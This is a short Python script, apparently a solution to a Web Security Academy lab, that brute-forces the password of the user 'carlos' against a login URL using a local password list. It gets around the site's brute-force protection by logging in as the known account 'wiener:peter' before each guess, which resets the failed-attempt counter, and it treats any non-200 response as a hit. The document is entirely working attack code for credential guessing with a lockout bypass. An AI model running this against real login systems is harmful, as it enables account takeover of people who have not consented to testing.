import requests, signal, sys

def read_file(file):
    content = []

    f = open(file, "r")
    while(True):
        linea = f.readline().rstrip('\n')
        content.append(linea)
        if not linea:
            break
    f.close()

    del content[-1]
    return content

def reset_time(url):
    response = requests.post(url=url, data={"username":"wiener","password":"peter"})


def valid_password(url, valid_usernames, passwords):

    valid_password = dict.fromkeys(valid_usernames, '')

    for username in valid_usernames:
        for password in passwords:
            reset_time(url)
            response_pass = requests.post(url=url,data={"username":username,"password":password}, allow_redirects=False)
            #print("Validando password: {}\tUsuario: {}\t".format(password,username))

            if response_pass.status_code == 200:
                pass
            else:
                valid_password[username] = password

    return valid_password

def def_handler(key,frame):
    print("\n[*] Saliendo")
    sys.exit(1)

def pretty(valid_passwords):
    for key, value in valid_passwords.items():
        print("\n[*] {}:{}".format(key,value))

def main():

    signal.signal(signal.SIGINT, def_handler)

    url = "https://ac081f5c1e720d7680553b5a009f00b8.web-security-academy.net/login"
    valid_usernames=["carlos"]

    print("\n[*] Validando password\n")
    passwords = read_file("passwords")
    valid_passwords = valid_password(url, valid_usernames, passwords)

    pretty(valid_passwords)

if __name__ == "__main__":
    main()